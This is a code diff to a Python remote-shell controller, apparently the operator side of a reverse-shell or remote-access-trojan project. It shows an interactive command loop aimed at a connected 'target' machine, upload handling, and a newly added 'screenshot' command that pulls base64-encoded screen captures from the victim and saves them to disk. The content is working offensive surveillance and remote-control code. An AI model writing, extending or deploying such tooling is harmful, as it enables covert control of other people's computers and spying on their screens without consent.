@@ -3,6 +3,8 @@ import socket
 import json
 import base64
 
+count = 1
+
 def reliable_send(data):
     json_data = json.dumps(data)
     target.send(json_data.encode())
@@ -19,6 +21,7 @@ def reliable_recv():
 
 
 def shell():
+    global count
     while True:
         command = input('* Shell#~%s: ' % str(ip))
         reliable_send(command)
@@ -41,6 +44,15 @@ def shell():
                 failed = "Failed to Upload"
                 reliable_send(base64.b64encode(failed.encode()))
                 continue
+        elif command[:10] == 'screenshot':
+            with open("screenshot%d" % count, 'wb') as screen:
+                image = reliable_recv()
+                image_decoded = base64.b64decode(image)
+                if image_decoded[:4] == '[!!]':
+                    print(image_decoded)
+                else:
+                    screen.write(image_decoded)
+                    count += 1
         else:
             result = reliable_recv()
             print(result)
